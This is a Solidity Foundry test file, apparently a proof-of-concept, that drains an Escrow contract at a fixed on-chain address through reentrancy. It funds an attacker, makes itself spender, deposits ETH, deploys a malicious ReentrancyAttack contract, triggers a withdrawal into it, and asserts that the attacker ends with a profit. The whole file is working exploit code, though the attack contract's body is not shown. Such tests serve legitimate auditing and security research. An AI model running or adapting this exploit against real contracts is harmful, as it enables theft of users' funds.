contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);
    ReentrancyAttack public attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Give ourselves some ETH
        deal(attacker, 100 ether);

        // Set attacker as spender (and owner)
        vm.prank(attacker);
        Escrow(TARGET).setSpender(attacker);

        // Deposit some ETH to get a balance
        vm.prank(attacker);
        Escrow(TARGET).deposit{value: 1 ether}();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Deploy malicious contract
        ReentrancyAttack attack = new ReentrancyAttack(TARGET, attacker);

        // Start attack - withdraw to malicious contract
        vm.prank(attacker);
        Escrow(TARGET).withdraw(address(attack), 1 ether);

        // The attack contract should have received multiple ETH transfers
        uint256 attackBalance = address(attack).balance;
        console.log("Attack contract balance:", attackBalance);

        // Withdraw from attack contract to attacker
        attack.withdrawToAttacker();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

